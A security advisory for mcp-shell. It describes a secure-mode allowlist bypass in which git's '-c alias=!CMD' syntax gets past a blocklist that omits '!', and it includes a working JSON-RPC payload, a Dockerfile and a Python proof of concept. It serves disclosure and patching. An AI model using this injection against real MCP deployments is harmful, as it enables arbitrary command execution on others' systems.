# [H] mcp-shell has a Secure Mode Allowlist Bypass via Git Shell Alias

## Summary
Severity: High
Advisory: GHSA-74hp-mggr-hv58
CVE: CVE-2026-55582
CWE: CWE-78
Ecosystem: Go
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-08-25
Source: https://github.com/advisories/GHSA-74hp-mggr-hv58
Type: github-advisory

## Affected
- Go: `github.com/sonirico/mcp-shell` — affected >=0 <0.6.0

## Details
### Summary

`mcp-shell`'s "secure mode" is designed to restrict command execution to an allowlist of executables defined in `security.yaml`. The default configuration includes `/usr/bin/git`. The security validator in `security.go` blocks common shell metacharacters (`|&;<>(){}[]$\``) but omits `!`, which is the prefix Git uses to execute shell aliases (`alias.NAME=!CMD`). An attacker who can invoke the `shell_exec` MCP tool can pass `/usr/bin/git -c alias.pwn=!<arbitrary-command>` as the command argument, bypassing all validation and achieving arbitrary OS command execution as the `mcp-shell` process user. The default Docker image runs as `mcpuser` (UID 1000) with Git installed and secure mode enabled, making this exploitable in the default deployment with no authentication required.

### Details

The vulnerability is a classic OS Command Injection (CWE-78) in the `shell_exec` MCP tool handler. The data flow from attacker input to shell execution is:

1. **`main.go:89-91`** — The MCP tool schema exposes a required string parameter `command` with no server-side type constraints.
2. **`main.go:102`** — `shell_exec` is bound to `shellHandler.handle`.
3. **`handler.go:34`** — The handler reads the attacker-controlled value: `command, err := request.RequireString("command")`.
4. **`handler.go:49`** — The command string is passed to `h.validator.validateCommand(command)`.
5. **`security.go:136`** — `containsShellMetacharacters` checks for `|&;<>(){}[]$\`` but `!` is absent from the blocked set.
6. **`security.go:147-149`** — `containsDangerousShellConstructs` also does not include `!`.
7. **`security.go:85-96`** — `/usr/bin/git` matches `AllowedExecutables`; no per-argument policy exists for Git. The `blocked_patterns` list in `security.yaml:35` is empty (`[]`).
8. **`handler.go:59`** — The fully validated (but unsafe) command is forwarded to `h.executor.execute`.
9. **`executor.go:149-163`** — `parseCommand` splits the string with `strings.Fields`; `exec.CommandContext(ctx, executable, args...)` is called with `executable="/usr/bin/git"` and `args=["-c", "alias.pwn=!touch", "pwn", "/tmp/target"]`.
10. **`executor.go:199`** — `cmd.Run()` launches `git`. Git interprets `-c alias.pwn=!touch` as a runtime configuration entry, defining the alias `pwn` as the shell command `touch`. When Git resolves the subcommand `pwn`, it triggers the shell alias: `sh -c 'touch "$@"' _ /tmp/target`, creating the file.

The root cause is the missing `!` in the metacharacter blocklist and the absence of any per-executable argument policy that would prevent Git's `-c alias.*=!` pattern.

Incriminated source locations:
- `security.go:136` — metacharacter set missing `!`
- `security.go:147-149` — `containsDangerousShellConstructs` missing `!`
- `security.yaml:27` — `/usr/bin/git` in `allowed_executables`
- `security.yaml:35` — `blocked_patterns: []`
- `executor.go:149-163,199` — direct `exec.CommandContext` invocation with unsanitized Git arguments

### PoC

**Prerequisites:**
- Docker installed and the `mcp-shell-vuln-001` image built from the provided `Dockerfile` (repo root as build context, commit `c30862f`).
- Python 3 to run `poc.py`.

**Build the Docker image:**

```bash
docker build -f vuln-001/Dockerfile -t mcp-shell-vuln-001 .
```

**Run the PoC:**

```bash
python3 vuln-001/poc.py
```

The script performs the full MCP JSON-RPC handshake over stdin and sends the following `tools/call` request:

```json
{
  "jsonrpc": "2.0",
  "id": 2,
  "method": "tools/call",
  "params": {
    "name": "shell_exec",
    "arguments": {
      "command": "/usr/bin/git -c alias.pwn=!touch pwn /tmp/mcp-shell-mcp-poc",
      "base64": false
    }
  }
}
```

The container's `/tmp` is bind-mounted to a host temporary directory so the evidence file can be observed on the host without `docker exec`.

**Expected result:**

- MCP response: `{"status":"success","exit_code":0,"execution_time":"~3ms","security_info":{"security_enabled":true,...}}`
- Evidence file created at `<host_tmp>/mcp-shell-mcp-poc` with `uid=1000` (mcpuser), confirming arbitrary shell command execution inside the container.

**Validation bypass explanation:**

| Check | Value tested | Result |
|---|---|---|
| `containsShellMetacharacters` | `alias.pwn=!touch` | `false` — `!` not in blocklist |
| `containsDangerousShellConstructs` | `alias.pwn=!touch` | `false` — `!` not in blocklist |
| `matchesExecutable` | `/usr/bin/git` | `true` — in `AllowedExecutables` |

All checks pass; `git` receives `alias.pwn=!touch` as a config entry and executes `touch` as a shell alias.

### Impact

This is an **OS Command Injection** vulnerability (CWE-78). Any entity that can issue an MCP `tools/call` request to a `mcp-shell` instance running with the default Docker configuration can execute arbitrary OS commands as the `mcpuser` process account (UID 1000) inside the container.

The default Docker deployment sets `MCP_SHELL_SEC_CONFIG_FILE=/etc/mcp-shell/security.yaml`, installs `git`, and runs as `mcpuser`. The `shell_exec` tool requires no additional authentication beyond MCP connectivity. "Secure mode" is explicitly marketed as the mechanism preventing command injection; this bypass nullifies that protection entirely.

Impacted parties:
- **Users and operators** who deploy the default `mcp-shell` Docker image and expose it to MCP clients (directly via stdio, or via an MCP bridge/proxy over the network).
- **AI agent systems** that integrate `mcp-shell` as a tool provider, where a compromised or malicious LLM prompt could supply the exploit payload as the `command` argument.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
# VULN-001: Secure Mode Allowlist Bypass via Git Shell Alias
# CWE-78: OS Command Injection
#
# This Dockerfile reproduces the exact default Docker deployment environment of
# sonirico/mcp-shell at commit c30862f that is affected by VULN-001.
#
# Vulnerability summary:
#   - security.yaml allows /usr/bin/git in allowed_executables
#   - The security validator (security.go) does not block '!' in arguments
#   - Git's '-c alias.NAME=!CMD' syntax executes CMD as a shell command
#   - This bypasses "secure mode" and achieves arbitrary command execution
#
# Build context must be the repo parent directory:
#   docker build -f vuln-001/Dockerfile -t mcp-shell-vuln-001 .

# Stage 1: Build the mcp-shell binary from the vulnerable source
FROM golang:1.25-alpine AS builder

RUN apk add --no-cache git ca-certificates

WORKDIR /src

# Download dependencies before copying source for better layer caching
COPY repo/go.mod repo/go.sum ./
RUN go mod download

# Copy and build the vulnerable source
COPY repo/*.go ./
RUN CGO_ENABLED=0 GOOS=linux go build \
    -ldflags "-s -w" \
    -o mcp-shell .

# Stage 2: Runtime environment matching the default mcp-shell Docker image
FROM alpine:3.22

# Install git — this is what the default Dockerfile does (apk add git),
# and it is what makes the exploit possible: /usr/bin/git is present and
# the security config allows it.
RUN apk add --no-cache bash git

# Create non-root user matching the default Docker image
RUN addgroup -g 1000 mcpuser && \
    adduser -D -s /bin/bash -u 1000 -G mcpuser mcpuser

# Install the mcp-shell binary
COPY --from=builder /src/mcp-shell /usr/local/bin/mcp-shell

# Install the default (vulnerable) security configuration.
# Key properties that enable the exploit:
#   allowed_executables includes /usr/bin/git
#   blocked_patterns is empty
#   security.go does not list '!' in blocked metacharacters
COPY repo/security.yaml /etc/mcp-shell/security.yaml

# Replicate the default environment variables from the repo Dockerfile
ENV MCP_SHELL_SEC_CONFIG_FILE=/etc/mcp-shell/security.yaml
ENV MCP_SHELL_LOG_FORMAT=json
ENV PATH="/usr/local/bin:${PATH}"

USER mcpuser
WORKDIR /home/mcpuser

# mcp-shell reads JSON-RPC over stdin and writes responses to stdout
ENTRYPOINT ["mcp-shell"]
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
Proof-of-Concept for VULN-001: Secure Mode Allowlist Bypass via Git Shell Alias
Repository:  sonirico/mcp-shell (commit c30862f)
CWE-78:      OS Command Injection

Vulnerability:
    mcp-shell "secure mode" uses security.yaml to allowlist executables.
    The default config allows /usr/bin/git.  The security validator in
    security.go checks for metacharacters (|&;<>(){}[]$`\\) but does NOT
    include '!' in the blocked set.  Git's -c flag accepts runtime config
    overrides; setting 'alias.NAME=!CMD' defines a shell alias that runs
    CMD as a shell command when 'NAME' is used as a git subcommand.

Exploit payload (MCP tools/call -> shell_exec argument):
    /usr/bin/git -c alias.pwn=!touch pwn /tmp/mcp-shell-mcp-poc

    Validation path (all checks pass):
      containsShellMetacharacters("alias.pwn=!touch")  -> False  (! not in set)
      containsDangerousShellConstructs("alias.pwn=!touch") -> False (! not in set)
      matchesExecutable("/usr/bin/git", "/usr/bin/git") -> True

    Execution path:
      exec.CommandContext(ctx, "/usr/bin/git",
          "-c", "alias.pwn=!touch", "pwn", "/tmp/mcp-shell-mcp-poc")
      -> git defines alias pwn = !touch
      -> git runs subcommand "pwn" -> triggers shell alias
      -> sh -c 'touch "$@"' _ /tmp/mcp-shell-mcp-poc
      -> file /tmp/mcp-shell-mcp-poc is created

Evidence method:
    The container's /tmp is bind-mounted to a host temporary directory.
    After the MCP call, verify the evidence file exists on the host.

Usage:
    # From the repo parent directory:
    docker build -f vuln-001/Dockerfile -t mcp-shell-vuln-001 .
    python3 vuln-001/poc.py
"""

import json
import os
import subprocess
import sys
import tempfile
import stat

IMAGE_NAME = "mcp-shell-vuln-001"
EVIDENCE_FILENAME = "mcp-shell-mcp-poc"
EXPLOIT_TARGET = f"/tmp/{EVIDENCE_FILENAME}"

# MCP JSON-RPC protocol requires:
#   1. initialize handshake (client -> server)
#   2. notifications/initialized acknowledgement
#   3. tools/call with the exploit payload
MCP_INITIALIZE = json.dumps({
    "jsonrpc": "2.0",
    "id": 1,
    "method": "initialize",
    "params": {
        "protocolVersion": "2024-11-05",
        "capabilities": {},
        "clientInfo": {"name": "vuln-001-poc", "version": "1.0.0"},
    },
})

MCP_INITIALIZED = json.dumps({
    "jsonrpc": "2.0",
    "method": "notifications/initialized",
})

# The malicious command:
#   /usr/bin/git    - allowed by security.yaml AllowedExecutables
#   -c alias.pwn=!touch  - git runtime config; ! prefix = shell alias
#                          NOT blocked: '!' absent from security.go metachars
#   pwn             - triggers the alias (git subcommand lookup)
#   /tmp/<file>     - argument forwarded to touch by git shell alias
MCP_EXPLOIT = json.dumps({
    "jsonrpc": "2.0",
    "id": 2,
    "method": "tools/call",
    "params": {
        "name": "shell_exec",
        "arguments": {
            "command": f"/usr/bin/git -c alias.pwn=!touch pwn {EXPLOIT_TARGET}",
            "base64": False,
        },
    },
})


def run(args, **kwargs):
    print(f"[*] {' '.join(str(a) for a in args)}")
    return subprocess.run(args, **kwargs)


def parse_mcp_response(stdout_text):
    """Parse newline-delimited JSON-RPC responses, return the tools/call result."""
    for line in stdout_text.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            msg = json.loads(line)
            if msg.get("id") == 2:
                return msg
        except json.JSONDecodeError:
            pass
    return None


def main():
    print("=" * 62)
    print("VULN-001 PoC — mcp-shell Secure Mode Bypass via Git Alias")
    print("=" * 62)
    print()

    # Create a host-side temporary directory that will be bind-mounted
    # as /tmp inside the container.  This lets us observe file creation
    # caused by the git shell alias without needing 'docker exec'.
    host_tmp = tempfile.mkdtemp(prefix="mcp-vuln001-")
    # Allow UID 1000 (mcpuser inside the container) to write files here.
    os.chmod(host_tmp, 0o1777)
    evidence_host_path = os.path.join(host_tmp, EVIDENCE_FILENAME)

    print(f"[*] Host bind-mount (-> /tmp inside container): {host_tmp}")
    print(f"[*] Expected evidence file on host: {evidence_host_path}")
    print()
    print(f"[*] Exploit command (shell_exec argument):")
    print(f"      /usr/bin/git -c alias.pwn=!touch pwn {EXPLOIT_TARGET}")
    print()

    # Build the newline-delimited JSON-RPC payload sent over stdin.
    # mcp-shell reads one JSON object per line.
    payload_bytes = (
        MCP_INITIALIZE + "\n" +
        MCP_INITIALIZED + "\n" +
        MCP_EXPLOIT + "\n"
    ).encode()

    print("[*] Sending MCP JSON-RPC payload to container via stdin ...")
    try:
        proc = run(
            [
                "docker", "run",
                "--rm",            # Remove container on exit
                "-i",              # Keep stdin open for piped input
                "--network=none",  # No external network access (safety)
                "-v", f"{host_tmp}:/tmp",   # Expose container's /tmp on host
                IMAGE_NAME,
            ],
            input=payload_bytes,
            capture_output=True,
            timeout=40,
        )
    except subprocess.TimeoutExpired:
        print("[FAIL] docker run timed out after 40 seconds")
        sys.exit(1)
    except FileNotFoundError:
        print("[FAIL] 'docker' not found — install Docker to run this PoC")
        sys.exit(1)

    stdout = proc.stdout.decode(errors="replace")
    stderr = proc.stderr.decode(errors="replace")

    print()
    print("[*] Container stdout (MCP responses):")
    for line in stdout.splitlines():
        print(f"    {line}")

    if stderr.strip():
        print("[*] Container stderr:")
        for line in stderr.splitlines():
            print(f"    {line}")

    print()

    # Locate and pretty-print the tools/call MCP response.
    exploit_response = parse_mcp_response(stdout)
    if exploit_response:
        print("[*] MCP tools/call response (id=2):")
        print(json.dumps(exploit_response, indent=4))
        print()

    # --- Primary evidence check ---
    if os.path.exists(evidence_host_path):
        st = os.stat(evidence_host_path)
        print(f"[PASS] Evidence file found on host: {evidence_host_path}")
        print(f"       size={st.st_size}  mode={oct(st.st_mode)}  uid={st.st_uid}")
        print()
        print("[PASS] EXPLOIT SUCCESSFUL")
        print("       'touch /tmp/mcp-shell-mcp-poc' was executed INSIDE the container")
        print("       by the git shell alias, bypassing mcp-shell secure mode.")
        passed = True
        evidence = (
            f"File '{evidence_host_path}' created on host via /tmp volume mount. "
            f"size={st.st_size} uid={st.st_uid} mode={oct(st.st_mode)}. "
            f"MCP response: {json.dumps(exploit_response) if exploit_response else 'n/a'}"
        )
    else:
        print(f"[FAIL] Evidence file NOT found at: {evidence_host_path}")
        print("[FAIL] EXPLOIT FAILED")
        if exploit_response:
            result_content = exploit_response.get("result", {})
            print(f"       MCP result: {json.dumps(result_content)}")
        passed = False
        evidence = (
            f"Evidence file was not created. "
            f"stdout={stdout[:600]!r} stderr={stderr[:300]!r}"
        )

    print()
    return passed, evidence


if __name__ == "__main__":
    passed, evidence = main()
    sys.exit(0 if passed else 1)
```

## References
- https://github.com/sonirico/mcp-shell/security/advisories/GHSA-74hp-mggr-hv58
- https://github.com/sonirico/mcp-shell/pull/16
- https://github.com/sonirico/mcp-shell/commit/f31377fce6ec31114e5a4398c0e5270552bce09f
- https://github.com/sonirico/mcp-shell
- https://github.com/sonirico/mcp-shell/releases/tag/v0.6.0
